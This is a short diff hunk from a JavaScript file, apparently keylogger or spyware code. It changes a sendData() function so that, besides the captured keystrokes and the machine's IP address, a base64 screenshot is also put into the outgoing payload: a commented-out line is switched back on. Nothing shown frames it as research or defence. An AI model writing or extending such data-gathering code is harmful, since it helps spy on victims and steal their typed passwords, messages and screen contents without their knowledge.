@@ -45,7 +45,7 @@ async function sendData() {
       data: [
         keystrokes,       // Data 1: Keystrokes array
         getIPAddress(),   // Data 2: IP address
-        // screenshot        // Data 3: Screenshot as base64 string
+        screenshot        // Data 3: Screenshot as base64 string
       ]
     }
 
